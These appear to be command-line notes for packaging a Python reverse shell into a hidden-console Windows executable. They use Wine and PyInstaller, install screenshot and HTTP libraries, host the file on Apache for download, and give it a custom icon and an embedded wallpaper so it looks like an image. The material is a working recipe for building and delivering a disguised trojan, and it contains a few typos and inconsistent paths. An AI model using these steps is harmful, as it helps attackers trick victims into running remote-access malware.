Install Wine to convert .py to.exe

dpkg --add-architecure i386
apt-get update
sudo apt-get install wine32
winecfg
cd /root/.wine/

# Download Python
# Install x86 version on Linux
cd /root/Downloads
wine msiexec /i python.2.7.14.msi

wine /home/esmith/.wine/drive_c/python27/python.exe -m pip install pyinstaller

# Install required Python libraries
wine /home/esmith/.wine/drive_c/python27/python.exe -m pip install requests
wine /home/esmith/.wine/drive_c/python27/python.exe -m pip install mss

# Convert Python to .exe
wine /home/esmith/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole rs.py

ls


# Use Apache for file transfer
mv python.exe /var/www//html
sudo service apache2 start
# Delete index.html if required
# Hit URL

# Change icon in compile
Download ico from web
wine /home/esmith/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --icon /path/to/my.ico reverseshell.py

# Embed to wallpaper
Download wallpaper
wine /home/esmith/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/path/to/wallpaper.jpg;." --onefile --noconsole --icon /path/to/my.ico reverseshell.py